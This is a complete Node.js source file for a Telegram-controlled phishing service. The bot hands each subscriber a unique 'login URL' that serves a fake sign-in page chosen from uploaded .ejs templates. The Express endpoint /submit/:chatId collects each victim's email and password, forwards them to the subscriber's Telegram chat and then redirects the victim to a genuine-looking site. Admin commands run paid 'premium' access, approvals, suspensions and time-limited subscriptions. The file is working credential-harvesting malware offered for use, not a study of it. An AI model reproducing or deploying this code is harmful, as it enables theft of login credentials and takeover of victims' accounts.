const express = require('express');
const bodyParser = require('body-parser');
const { Markup } = require('telegraf');
const path = require('path');
const fs = require('fs');
const ejs = require('ejs');
const TelegramBot = require('node-telegram-bot-api');

// Configuration
const { botToken, hostURL, adminChatId } = require('./config');
const bot = new TelegramBot(botToken, { polling: true });

// Initialize Express app
const app = express();
const PORT = process.env.PORT || 3000;
app.set('view engine', 'ejs');
app.use(bodyParser.urlencoded({ extended: true }));

// User Data Storage
const users = {};
let premiumMode = false;
let pendingUsers = new Set();
let approvedUsers = new Set();
let suspendedUsers = new Set();
let timerUsers = new Map();

// File Paths for storing users data
const usersFile = 'users.json';
const approvedUsersFile = 'approvedUsers.json';
const pendingUsersFile = 'pendingUsers.json';
const suspendedUsersFile = 'suspendedUsers.json';
const timerUsersFile = 'timer.json';

// Function to load user data from the JSON file
const loadUserData = () => {
  // Load users
  if (fs.existsSync(usersFile)) {
    try {
      const data = JSON.parse(fs.readFileSync(usersFile));
      for (const userId in data) {
        users[userId] = data[userId];  // Load user data into the users object
      }
    } catch (error) {
      console.error('Error loading user data:', error);
    }
  } else {
    fs.writeFileSync(usersFile, JSON.stringify({})); // Create empty file if missing
  }

  // Load approvedUsers
  if (fs.existsSync(approvedUsersFile)) {
    try {
      const data = JSON.parse(fs.readFileSync(approvedUsersFile));
      approvedUsers = new Set(data.filter(userId => typeof userId === 'number' && !isNaN(userId)));
    } catch (error) {
      console.error('Error loading approved users:', error);
    }
  }

  // Load suspendedUsers
  if (fs.existsSync(suspendedUsersFile)) {
    try {
      const data = JSON.parse(fs.readFileSync(suspendedUsersFile));
      suspendedUsers = new Set(data.filter(userId => typeof userId === 'number' && !isNaN(userId)));
    } catch (error) {
      console.error('Error loading suspended users:', error);
    }
  }

  // Load pendingUsers
  if (fs.existsSync(pendingUsersFile)) {
    try {
      const data = JSON.parse(fs.readFileSync(pendingUsersFile));
      pendingUsers = new Set(data.filter(userId => typeof userId === 'number' && !isNaN(userId)));
    } catch (error) {
      console.error('Error loading pending users:', error);
    }
  } else {
    fs.writeFileSync(pendingUsersFile, JSON.stringify([])); // Create empty file if missing
    pendingUsers = new Set();
  }

  // Load timerUsers
  if (fs.existsSync(timerUsersFile)) {
    try {
      const data = JSON.parse(fs.readFileSync(timerUsersFile));
      if (typeof data === 'object') {
        for (const userId in data) {
          if (data[userId] && typeof data[userId] === 'object' && !isNaN(userId)) {
            timerUsers.set(parseInt(userId), data[userId]);
          }
        }
      }
    } catch (error) {
      console.error('Error loading timer users:', error);
    }
  } else {
    fs.writeFileSync(timerUsersFile, JSON.stringify({})); // Create empty file if missing
  }
};

// Function to save user data to the JSON file
const saveUserData = () => {
  fs.writeFileSync(usersFile, JSON.stringify(users, null, 2));
};

// Function to save pending users
const savePendingUsers = () => {
  fs.writeFileSync(pendingUsersFile, JSON.stringify([...pendingUsers]));
};

// Function to save timer users
const saveTimerUsers = () => {
  const obj = Object.fromEntries(timerUsers);
  fs.writeFileSync(timerUsersFile, JSON.stringify(obj));
};

// Load the data
loadUserData();

// Helper Function: Check if User is Admin
const isAdmin = (chatId) => chatId.toString() === adminChatId.toString();

// Helper function to get user names
const getUserName = (userId) => {
  const user = users[userId];
  if (user) {
    return `${user.firstName} ${user.lastName || ""}`.trim();
  }
  return `User ${userId}`;  // Fallback if name is missing
};

// Ensure Bot Starts First
bot.on('message', (msg) => {
  const chatId = msg.chat.id;
  if (!users[chatId] && msg.text !== '/start') {
    bot.sendMessage(chatId, '❌ Please first use /start to initialize the bot.');
    return;
  }
});

// Handle /start Command
bot.onText(/\/start/, (msg) => {
  const { id: chatId, first_name, last_name } = msg.chat;
  const fullName = `${first_name || "User"} ${last_name || ""}`.trim();

  // Store user data if not already stored
  if (!users[chatId]) {
    users[chatId] = { firstName: first_name, lastName: last_name, chatId };
    saveUserData(); // Save the updated user data to the file
  }

  // Handle Admin Users
  if (isAdmin(chatId)) {
    bot.sendMessage(
      chatId,
      `👋 Welcome, ${fullName}!\n😊 You are an Admin.\n🆔 Chat ID: ${chatId}\n🔹 Account Status: Full Access\n\n📊 **User Stats:**\n👥 Total: ${approvedUsers.size}\n⏳ Pending: ${pendingUsers.size}\n✅ Approved: ${approvedUsers.size}\n🚫 Suspended: ${suspendedUsers.size}\n⏲️ Timer Users: ${timerUsers.size}`
    );
    return;
  }

  // Determine user account status
  let accountStatus = "Free";
  let statusMessage = "You can use the bot freely.";
  let remainingTimeMessage = "";
  if (premiumMode) {
    if (approvedUsers.has(chatId)) {
      accountStatus = "Premium User";

      // Check if user has an active timer
      if (timerUsers.has(chatId)) {
        const { expireTime } = timerUsers.get(chatId);
        const remainingTime = getRemainingTime(expireTime);

        remainingTimeMessage = `\n⌛ **Remaining Time:** ${remainingTime.days} days, ${remainingTime.hours} hours, ${remainingTime.minutes} minutes`;
      }
    } else if (pendingUsers.has(chatId)) {
      accountStatus = "Pending Approval";
    } else if (suspendedUsers.has(chatId)) {
      accountStatus = "Suspended";
    } else {
      pendingUsers.add(chatId);
      savePendingUsers(); // Save the pending users list
      bot.sendMessage(adminChatId, `🔔 New user pending approval: ${chatId}`);
      accountStatus = "Pending Approval";
    }
    statusMessage = "Premium Mode is ON. Approval required to use the bot.";
  }
  // Send the messages
  bot.sendMessage(
    chatId, 
    `👋 Welcome, ${fullName}!\n🆔 Chat ID: ${chatId}\n🔹 Account Status: ${accountStatus}\n\n${statusMessage}${remainingTimeMessage}`,
    { parse_mode: "Markdown" }
  );
});
// Admin Panel Command Handler
bot.onText(/\/admin/, (msg) => {
  const chatId = msg.chat.id;
  if (!isAdmin(chatId)) {
    return bot.sendMessage(chatId, '❌ Access Denied: You are not authorized to use the admin panel.');
  }
  const adminPanelButtons = [
    [
      { text: '🔑 Toggle Premium', callback_data: 'toggle_premium' },
      { text: '👥 Pending Users', callback_data: 'view_pending' },
      { text: '🚫 Suspend User', callback_data: 'suspend_user' },
    ],
    [
      { text: '🗑️ Delete User', callback_data: 'delete_user' },
      { text: '➕ Add Custom User', callback_data: 'add_custom_user' },
    ],
    [
      { text: '✅ Approved Users', callback_data: 'view_approved' },
      { text: '🚷 Suspended Users', callback_data: 'view_suspended' },
    ],
    [
      { text: '⏱️ Timer Users', callback_data: 'view_timer_users' },
      { text: '⏲️ Set Timer', callback_data: 'set_timer' },
    ],
    [
      { text: '📢 Broadcast', callback_data: 'broadcast' },  
      { text: '📄 Add Page', callback_data: 'add_page' },  
      { text: '❌ Delete Page', callback_data: 'delete_page' } // New Delete Page button
    ]
  ];
  bot.sendMessage(chatId, '🔧 *Admin Panel:* Choose an option:', {
    reply_markup: { inline_keyboard: adminPanelButtons },
    parse_mode: 'Markdown'
  });
});

// Handle Button Clicks
bot.on('callback_query', async (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const data = callbackQuery.data;

  if (!checkPremiumMode(chatId)) return;
  if (!isAdmin(chatId) && !data.startsWith('select_')) {
    return bot.sendMessage(chatId, '❌ You are not authorized to perform this action.');
  }

  if (data === 'toggle_premium') togglePremiumMode(chatId);
  else if (data === 'view_pending') showPendingUsers(chatId);
  else if (data === 'view_approved') showApprovedUsers(chatId);
  else if (data === 'suspend_user') suspendUser(chatId);
  else if (data === 'delete_user') deleteUser(chatId);
  else if (data === 'add_custom_user') promptForChatId(chatId);
  else if (data === 'add_page') addPage(chatId); // Calls addPage when clicking "Add Custom User"
  else if (data === 'delete_page') deletePage(chatId);  // Calls deletePage when clicking "Delete Page"
  else if (data === 'broadcast') handleBroadcast(chatId);
});



//------------Tougle Premium section-------------
// Check Premium Mode
const checkPremiumMode = (chatId) => {
  console.log(`Checking Premium Mode for Chat ID: ${chatId}`);
  if (premiumMode && !approvedUsers.has(chatId) && !isAdmin(chatId)) {
    bot.sendMessage(chatId, '❌ Premium mode is enabled. You need admin approval to use this bot.');
    return false;
  }
  return true;
};

// Toggle Premium Mode
const togglePremiumMode = (chatId) => {
  premiumMode = !premiumMode;
  bot.sendMessage(chatId, `✅ Premium mode is now ${premiumMode ? 'ON' : 'OFF'}.`);
  if (premiumMode) notifyPendingUsersAboutPremium(chatId);
};

// Notify Users About Premium
const notifyPendingUsersAboutPremium = (chatId) => {
  pendingUsers.forEach(userId => {
    if (!approvedUsers.has(userId)) {
      bot.sendMessage(userId, '❌ Premium mode is ON. You need admin approval to use the bot.');
    }
  });
};


//------------Add custom user section------------
// Admin Adds Custom User (Chat ID)
const promptForChatId = (chatId) => {
  bot.sendMessage(chatId, 'Please provide the Chat ID of the user you want to approve:');
  users[chatId] = { step: 'entering_chatid' };
};

// Entering Chat ID to Add Custom User
bot.on('message', (msg) => {
  const chatId = msg.chat.id;

  if (users[chatId]?.step === 'entering_chatid') {
    handleAddCustomUser(chatId, msg.text);
  }
});

// Add Custom User Logic
const handleAddCustomUser = (chatId, enteredChatId) => {
  const chatIdInt = parseInt(enteredChatId);
  if (isNaN(chatIdInt)) {
    return bot.sendMessage(chatId, '❌ Invalid Chat ID. Please enter a valid number.');
  }
  if (approvedUsers.has(chatIdInt)) {
    return bot.sendMessage(chatId, '❌ This user is already in the approved list.');
  }
  approvedUsers.add(chatIdInt);
  fs.writeFileSync(approvedUsersFile, JSON.stringify([...approvedUsers]));
  bot.sendMessage(chatId, `✅ User with Chat ID ${chatIdInt} has been added to the approved users list.`);
  bot.sendMessage(chatIdInt, '✅ You have been approved and can now use the bot.');
  // Reset step after completion
  users[chatId].step = null;
};


//---------Pending and Approve section----------
// Function to show pending users
const showPendingUsers = (chatId) => {
  if (pendingUsers.size === 0) {
    bot.sendMessage(chatId, 'No pending users.');
    return;
  }
  const keyboard = [...pendingUsers].map((userId) => [{
    text: `Approve ${userId}`,
    callback_data: `approve_${userId}`
  }]);
  bot.sendMessage(chatId, '⏳ Pending Users:', {
    reply_markup: { inline_keyboard: keyboard }
  });
};


// Function to approve pending user
bot.on('callback_query', (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const data = callbackQuery.data;
  if (data.startsWith('approve_')) {
    const userId = parseInt(data.replace('approve_', ''));
    if (isNaN(userId)) {
      console.log('Invalid user ID for approval');
      return;
    }
    pendingUsers.delete(userId);
    savePendingUsers(); // Save pending users after approval
    approvedUsers.add(userId);
    fs.writeFileSync(approvedUsersFile, JSON.stringify([...approvedUsers]));
    bot.sendMessage(userId, '✅ You have been approved! You can now use the bot.');
    bot.sendMessage(chatId, `✅ User ${userId} approved successfully.`);
  }
});

// Function to show approved users
const showApprovedUsers = (chatId) => {
  if (approvedUsers.size === 0) {
    bot.sendMessage(chatId, 'No approved users.');
    return;
  }
  const userList = [...approvedUsers].join('\n');
  bot.sendMessage(chatId, `✅ Approved Users:\n${userList}`);
};

//---------------Suspend section-----------------
// Suspend user
const suspendUser = (chatId) => {
  if (approvedUsers.size === 0) {
    bot.sendMessage(chatId, 'No approved users to suspend.');
    return;
  }
  const keyboard = [...approvedUsers].map((userId) => [{
    text: `Suspend ${userId}`,
    callback_data: `suspend_${userId}`
  }]);
  bot.sendMessage(chatId, '⏳ Select a user to suspend:', {
    reply_markup: { inline_keyboard: keyboard }
  });
};

// Suspend user after selection
bot.on('callback_query', (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const data = callbackQuery.data;
  if (data.startsWith('suspend_')) {
    const userId = parseInt(data.replace('suspend_', ''));
    if (isNaN(userId)) {
      console.log('Invalid user ID for suspension');
      return;
    }
    approvedUsers.delete(userId);
    suspendedUsers.add(userId);
    fs.writeFileSync(approvedUsersFile, JSON.stringify([...approvedUsers]));
    fs.writeFileSync(suspendedUsersFile, JSON.stringify([...suspendedUsers]));
    bot.sendMessage(userId, '❌ You have been suspended and can no longer use the bot.');
    bot.sendMessage(chatId, `✅ User ${userId} suspended.`);
  }
});


//----------------Delete Section-----------------
// Delete users with Timer Removal Option
const deleteUser = (chatId) => {
  const allUsers = [...approvedUsers, ...pendingUsers, ...suspendedUsers];
  if (allUsers.length === 0) {
    bot.sendMessage(chatId, '❌ No users to delete.');
    return;
  }
  const keyboard = allUsers.map((userId) => {
    const timerButton = timerUsers.has(userId) || timerUsers.has(String(userId))
      ? { text: `🕒 Remove Timer for ${userId}`, callback_data: `delete_timer_${userId}` }
      : null;
    const deleteButton = { text: `🗑 Delete ${userId}`, callback_data: `delete_${userId}` };
    return timerButton ? [deleteButton, timerButton] : [deleteButton];
  });

  bot.sendMessage(chatId, '⏳ Select a user to delete or remove their timer:', {
    reply_markup: { inline_keyboard: keyboard }
  });
};

// Handle deletion of a user or their timer
bot.on('callback_query', (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const data = callbackQuery.data;

  // Handle user deletion
  if (data.startsWith('delete_') && !data.startsWith('delete_timer_')) {
    const userId = Number(data.replace('delete_', ''));
    if (isNaN(userId)) {
      return bot.sendMessage(chatId, "❌ Invalid user ID.");
    }
    deleteUserFromSets(userId);
    bot.sendMessage(chatId, `✅ User ${userId} has been deleted.`);
  }

  // Handle timer deletion
  if (data.startsWith('delete_timer_')) {
    const userId = Number(data.replace('delete_timer_', ''));

    if (isNaN(userId)) {
      return bot.sendMessage(chatId, "❌ Invalid user ID.");
    }

    console.log("Before Deletion:", [...timerUsers]); // Debugging log

    if (timerUsers.has(userId) || timerUsers.has(String(userId))) {
      timerUsers.delete(userId);
      timerUsers.delete(String(userId)); // Delete both number and string versions
      saveTimerUsers();

      console.log("After Deletion:", [...timerUsers]); // Debugging log

      bot.sendMessage(chatId, `✅ Timer removed for User ID: ${userId}`);

      // Attempt to send a message to the user
      try {
        bot.sendMessage(userId, "❌ Your timer has been removed by an admin.");
      } catch (error) {
        console.error(`Failed to send message to ${userId}:`, error);
      }
    } else {
      bot.sendMessage(chatId, "❌ This user does not have an active timer.");
    }
  }
});

// Remove user from sets and update storage files
const deleteUserFromSets = (userId) => {
  if (isNaN(userId)) {
    console.log('Invalid user ID: NaN, skipping deletion.');
    return;
  }
  let removed = false;

  if (approvedUsers.has(userId)) {
    approvedUsers.delete(userId);
    fs.writeFileSync(approvedUsersFile, JSON.stringify([...approvedUsers]));
    removed = true;
  }
  if (pendingUsers.has(userId)) {
    pendingUsers.delete(userId);
    fs.writeFileSync(pendingUsersFile, JSON.stringify([...pendingUsers]));
    removed = true;
  }
  if (suspendedUsers.has(userId)) {
    suspendedUsers.delete(userId);
    fs.writeFileSync(suspendedUsersFile, JSON.stringify([...suspendedUsers]));
    removed = true;
  }
  
  if (!removed) {
    console.log(`User ${userId} not found in any list.`);
  }
};


//-----------Show Suspend User Section-----------
// Function to show suspended users
const showSuspendedUsers = (chatId) => {
  if (suspendedUsers.size === 0) {
    bot.sendMessage(chatId, '✅ No suspended users.');
    return;
  }
  const keyboard = [...suspendedUsers].map((userId) => [
    { text: `Approve ${userId}`, callback_data: `approve_suspended_${userId}` }
  ]);
  bot.sendMessage(chatId, '⏳ Suspended Users:', {
    reply_markup: { inline_keyboard: keyboard }
  });
};

// Callback for "View Suspended Users"
bot.on('callback_query', (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const data = callbackQuery.data;
  if (data === 'view_suspended') {
    showSuspendedUsers(chatId);
  } else if (data.startsWith('approve_suspended_')) {
    const userId = parseInt(data.replace('approve_suspended_', ''));
    if (suspendedUsers.has(userId)) {
      suspendedUsers.delete(userId);
      approvedUsers.add(userId);
      fs.writeFileSync(suspendedUsersFile, JSON.stringify([...suspendedUsers]));
      fs.writeFileSync(approvedUsersFile, JSON.stringify([...approvedUsers]));
      bot.sendMessage(userId, '✅ You have been approved! You can now use the bot.');
      bot.sendMessage(chatId, `✅ User ${userId} has been approved.`);
    } else {
      bot.sendMessage(chatId, '❌ This user is not in the suspended list.');
    }
  }
});


//-------------Start Timer section---------------
// Function to calculate remaining time
function getRemainingTime(expireTime) {
    const now = Date.now();
    const remainingTimeMs = Math.max(0, expireTime - now);

    return {
        days: Math.floor(remainingTimeMs / (1000 * 60 * 60 * 24)),
        hours: Math.floor((remainingTimeMs % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60)),
        minutes: Math.floor((remainingTimeMs % (1000 * 60 * 60)) / (1000 * 60))
    };
}

// Set Timer for User
const setTimerForUser = (chatId, userId) => {
    bot.sendMessage(chatId, 'Please enter the number of days for the validity period.');
    users[chatId] = { step: 'entering_timer', userId };
};

// Handle Timer Input
bot.on('message', (msg) => {
    const chatId = msg.chat.id;

    if (users[chatId]?.step === 'entering_timer') {
        const validityDays = parseInt(msg.text);

        if (isNaN(validityDays)) {
            return bot.sendMessage(chatId, '❌ Invalid number of days.');
        }

        const expireTime = Date.now() + validityDays * 24 * 60 * 60 * 1000;
        timerUsers.set(users[chatId].userId, { validityDays, expireTime });

        saveTimerUsers(); // Save updated data

        bot.sendMessage(chatId, `✅ User ${users[chatId].userId} granted ${validityDays} days.`);
        bot.sendMessage(users[chatId].userId, `✅ Your validity period is ${validityDays} days.`);

        users[chatId].step = null;
    }
});

// Handle "Set Timer" Button Click
bot.on('callback_query', (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const data = callbackQuery.data;

    if (data === 'set_timer') {
        // Filter who already have a timer set
        const keyboard = [...approvedUsers]
            .filter((userId) => !timerUsers.has(userId))
            .map((userId) => [{ text: `Set Timer for ${userId}`, callback_data: `set_timer_${userId}` }]);

        if (keyboard.length === 0) {
            return bot.sendMessage(chatId, '❌ All users already have timers set.');
        }

        bot.sendMessage(chatId, '⏳ Select a user to set a timer:', { reply_markup: { inline_keyboard: keyboard } });

    } else if (data.startsWith('set_timer_')) {
        setTimerForUser(chatId, parseInt(data.replace('set_timer_', '')));

    } else if (data === 'view_timer_users') {
        if (timerUsers.size === 0) {
            return bot.sendMessage(chatId, '❌ No users with active timers.');
        }

        let message = "⏳ **Active Timer Users:**\n\n";

        for (const [userId, timer] of timerUsers) {
            const expireDate = new Date(timer.expireTime);
            const remainingTime = getRemainingTime(timer.expireTime);

            message += `👤 **User ID:** ${userId}\n`;
            message += `📅 **Total Time:** ${timer.validityDays} days\n`;
            message += `⏳ **Expire Time:** ${expireDate.toLocaleString()}\n`;
            message += `⌛ **Remaining Time:** ${remainingTime.days} days, ${remainingTime.hours} hours, ${remainingTime.minutes} minutes\n`;
            message += `------------------\n`;
        }

        bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
    }
});

//-----------Add/Delete page section-------------
// Function to handle "Add Page"
function addPage(chatId) {
  users[chatId] = { step: 'uploading_file' };
  bot.sendMessage(chatId, '📂 Please upload a .ejs file now.');
}

// Function to handle "Delete Page"
function deletePage(chatId) {
  const viewsFolderPath = path.join(__dirname, 'views');
  fs.readdir(viewsFolderPath, (err, files) => {
    if (err) {
      console.error(err);
      return bot.sendMessage(chatId, '❌ Error reading the folder.');
    }
    const fileNames = files.filter(file => path.extname(file) === '.ejs').map(file => path.basename(file, '.ejs'));
    if (fileNames.length === 0) {
      return bot.sendMessage(chatId, '❌ No .ejs files found in the /views folder.');
    }
    const keyboard = fileNames.map(fileName => [{ text: fileName, callback_data: `confirm_delete_${fileName}` }]);
    bot.sendMessage(chatId, '🗑 Please select a file to delete:', {
      reply_markup: { inline_keyboard: keyboard }
    });
  });
}

// Handle file upload for "Add Page"
bot.on('document', async (msg) => {
  const chatId = msg.chat.id;
  if (users[chatId]?.step !== 'uploading_file') return;

  const fileId = msg.document.file_id;
  const fileName = msg.document.file_name;
  if (!fileName.endsWith('.ejs')) {
    return bot.sendMessage(chatId, '❌ Only .ejs files are allowed!');
  }

  try {
    const fileLink = await bot.getFileLink(fileId);
    const filePath = path.join(__dirname, 'views', fileName);
    const response = await fetch(fileLink);
    const buffer = await response.arrayBuffer();
    fs.writeFileSync(filePath, Buffer.from(buffer));
    bot.sendMessage(chatId, `✅ File '${fileName}' uploaded successfully!`);
  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, '❌ Error uploading file. Please try again.');
  }

  users[chatId].step = null; // Reset step
});

// Handle confirmation of page deletion
bot.on('callback_query', (query) => {
  const chatId = query.message.chat.id;
  const data = query.data;

  if (data.startsWith('confirm_delete_')) {
    const fileNameToDelete = data.replace('confirm_delete_', '');
    const filePath = path.join(__dirname, 'views', `${fileNameToDelete}.ejs`);

    fs.unlink(filePath, (err) => {
      if (err) {
        console.error(err);
        return bot.sendMessage(chatId, `❌ Error deleting the file: ${err.message}`);
      }
      bot.sendMessage(chatId, `✅ Page "${fileNameToDelete}" has been successfully deleted.`);
    });
  }
});


//---------------Start Broadcast---------------
// Handle Broadcast
function handleBroadcast(chatId) {
  const options = {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Specific', callback_data: 'broadcast_specific' }, { text: 'All', callback_data: 'broadcast_all' }],
      ],
    },
  };
  bot.sendMessage(chatId, 'Please choose how to broadcast the message:', options);
}

// Handle ONLY "Specific" or "All" broadcast selection
bot.on('callback_query', (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const data = callbackQuery.data;

  if (!data.startsWith('broadcast_')) return; // Ignore non-broadcast buttons

  if (!isAdmin(chatId)) {
    return bot.answerCallbackQuery(callbackQuery.id, { text: "❌ Unauthorized", show_alert: true });
  }

  if (data === 'broadcast_specific') {
    let userList = [...approvedUsers, ...pendingUsers, ...suspendedUsers];
    let message = 'Select a user to send a message:\n\n';
    userList.forEach((userId, index) => {
      const userName = getUserName(userId);
      message += `${index + 1}. ${userName} (ID: ${userId})\n`;
    });

    bot.sendMessage(chatId, message);
    bot.once('message', (msg) => {
      const selectedUserIndex = parseInt(msg.text.trim());
      if (isNaN(selectedUserIndex) || selectedUserIndex < 1 || selectedUserIndex > userList.length) {
        bot.sendMessage(chatId, '❌ Invalid user selection.');
        return;
      }

      const userId = userList[selectedUserIndex - 1];
      const userName = getUserName(userId);
      bot.sendMessage(chatId, `You selected ${userName} (ID: ${userId}). Please enter your message:`);

      bot.once('message', (message) => {
        const userMessage = message.text;
        bot.sendMessage(userId, `<b>${userMessage}</b>`, { parse_mode: 'HTML' })
          .then(() => bot.sendMessage(chatId, `✅ Message sent to ${userName} (ID: ${userId}).`))
          .catch(err => bot.sendMessage(chatId, `❌ Failed to send message. Error: ${err.message}`));
      });
    });

  } else if (data === 'broadcast_all') {
    let allUsers = [...approvedUsers, ...pendingUsers, ...suspendedUsers];

    bot.sendMessage(chatId, 'Please enter your message to broadcast to all users:');
    bot.once('message', (message) => {
      const userMessage = message.text;
      allUsers.forEach(userId => bot.sendMessage(userId, `<b>${userMessage}</b>`, { parse_mode: 'HTML' }));
      bot.sendMessage(chatId, `✅ Broadcast complete!`);
    });
  }
});

//admin end



// Handle /create command
bot.onText(/\/create/, (msg) => {
  const chatId = msg.chat.id;
  if (!users[chatId]) {
    bot.sendMessage(chatId,);
    return;
  } // Ensure start first
  if (!checkPremiumMode(chatId)) return;
  if (users[chatId]?.step === 'selecting_file') {
    bot.sendMessage(chatId, '⚠️ You are already selecting a file. Please choose one from the list.');
    return;
  } // Prevent duplicate execution

  users[chatId] = { step: 'selecting_file' };
  const viewsFolderPath = path.join(__dirname, 'views');
  fs.readdir(viewsFolderPath, (err, files) => {
    if (err) {
      bot.sendMessage(chatId, 'Error reading the folder.');
      return;
    }
    const fileNames = files.filter(file => path.extname(file) === '.ejs').map(file => path.basename(file, '.ejs'));
    if (fileNames.length === 0) {
      bot.sendMessage(chatId, 'No files found in the /views folder.');
      return;
    }
    const keyboard = fileNames.map(fileName => [{
      text: fileName,
      callback_data: `select_${fileName}`
    }]);
    bot.sendMessage(chatId, 'Please select a file:', {
      reply_markup: {
        inline_keyboard: keyboard
      }
    });
  });
});

// Handle file selection for URL generation
bot.on('callback_query', (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const data = callbackQuery.data;
  if (!checkPremiumMode(chatId)) return;
  // prevent duplicate selection
  if (users[chatId]?.step === 'waiting_for_url') {
    return;
  }
  if (data.startsWith('select_')) {
    const selectedFileName = data.replace('select_', '');    
    if (!users[chatId]) {
      users[chatId] = {}; // Ensure user data is initialized
    }
    users[chatId].step = 'waiting_for_url';
    users[chatId].selectedFileName = selectedFileName;

    bot.sendMessage(chatId, `You selected: ${selectedFileName}\n🌐 Now enter your URL.`);
  }
});

// Handle URL input for creating login page
bot.on('message', (msg) => {
  const chatId = msg.chat.id;
  const messageText = msg.text;
  if (!checkPremiumMode(chatId)) return;
  if (users[chatId]?.step === 'waiting_for_url') {
    if (messageText.startsWith('https://')) {
      users[chatId].userRedirectUrl = `${messageText}?timestamp=${Date.now()}`;
    } else {
      users[chatId].userRedirectUrl = '';
    }
    const uniqueURL = `${hostURL}/${users[chatId].selectedFileName}/${chatId}`;
    bot.sendMessage(chatId, `🌐 Unique Login URL: ${uniqueURL}`, { parse_mode: 'HTML' });
    users[chatId].step = null;
  }
});

// Render pages dynamically
app.get('/:page/:chatId', (req, res) => {
  const { page, chatId } = req.params;
  res.render(page, { chatId });
});

// Handle form submission
app.post('/submit/:chatId', (req, res) => {
  const chatId = req.params.chatId;
  const { email, pass } = req.body;

  if (users[chatId]) {
    const message = `New login attempt:\n🌐 <b>Username:</b> ${email}\n🔒 <b>Password:</b> ${pass}`;
    bot.sendMessage(chatId, message, { parse_mode: 'HTML' })
      .then(() => res.redirect(users[chatId].userRedirectUrl || 'https://example.com'))
      .catch((error) => {
        console.error('Error sending message to Telegram:', error);
        res.status(500).send('Error sending message to Telegram');
      });
  } else {
    res.status(400).send('Incorrect Submitted Data.');
  }
});

// Start Express server
app.listen(PORT, () => {
  console.log(`Server running at ${hostURL}`);
});
